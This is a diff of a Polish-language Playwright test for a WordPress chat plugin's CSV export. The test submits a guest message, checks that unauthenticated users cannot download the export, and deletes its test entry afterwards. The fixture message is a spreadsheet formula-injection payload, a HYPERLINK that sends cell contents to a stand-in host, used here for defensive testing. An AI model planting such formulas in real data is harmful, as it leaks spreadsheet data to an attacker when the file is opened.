@@ -21,7 +21,25 @@ function sprawdz(opis, warunek) {
   });
   const p = await b.newPage();
 
-  console.log('[dostep bez zalogowania]');
+  /* Test robi sobie własny materiał: gość zostawia wiadomość, która JEST
+     formułą arkusza. Bez tego test zależałby od tego, co akurat leży w bazie —
+     i przechodziłby albo nie w zależności od cudzych porządków. */
+  console.log('[przygotowanie: gosc zostawia wiadomosc bedaca formula arkusza]');
+  await p.goto(BAZA + '/', { waitUntil: 'load' });
+  const zlozone = await p.evaluate(async () => {
+    const body = new FormData();
+    body.append('action', 'chatl_zgloszenie');
+    body.append('nonce', window.chatlDane.nonce);
+    body.append('sesja', 'test-csv-formula-01');
+    body.append('email', 'formula@przyklad.pl');
+    body.append('wiadomosc', '=HYPERLINK("http://zly.example/"&A1;"kliknij")');
+    body.append('zgoda', '1');
+    const o = await fetch(window.chatlDane.ajaxUrl, { method: 'POST', body: body });
+    return (await o.json()).success;
+  });
+  sprawdz('zgloszenie z formula zapisane przez endpoint goscia', zlozone === true);
+
+  console.log('\n[dostep bez zalogowania]');
   const obcy = await p.request.get(BAZA + '/wp-admin/admin-post.php?action=chatl_eksport_zgloszen');
   sprawdz('niezalogowany NIE dostaje pliku (HTTP ' + obcy.status() + ')', obcy.status() !== 200);
 
@@ -73,6 +91,19 @@ function sprawdz(opis, warunek) {
   sprawdz('kolumny sesja/data/kto/silnik/tresc', /^sesja,data,kto,silnik,tresc/.test(csv2));
   sprawdz('sa wiersze rozmow', csv2.trim().split('\n').length > 1);
   console.log('       przykladowy wiersz: ' + (csv2.split('\n')[1] || '').trim().slice(0, 140));
+
+  /* Sprzątanie po sobie: zgłoszenie testowe nie ma zostawać w bazie klienta. */
+  await p.goto(BAZA + '/wp-admin/admin.php?page=chatl-zgloszenia', { waitUntil: 'load' });
+  const wierszDoUsuniecia = await p.$('tr:has-text("formula@przyklad.pl")');
+  if (wierszDoUsuniecia) {
+    const usun = await wierszDoUsuniecia.$('a[href*="chatl_zgloszenie_usun"]');
+    if (usun) {
+      p.once('dialog', (d) => d.accept());
+      await usun.click();
+      await p.waitForLoadState('load');
+    }
+  }
+  sprawdz('zgloszenie testowe posprzatane', (await p.$('td:has-text("formula@przyklad.pl")')) === null);
 
   await b.close();
   console.log('\n' + (bledy ? 'NIEPOWODZENIE: ' + bledy + ' krokow nie przeszlo' : 'WSZYSTKIE KROKI PRZESZLY'));
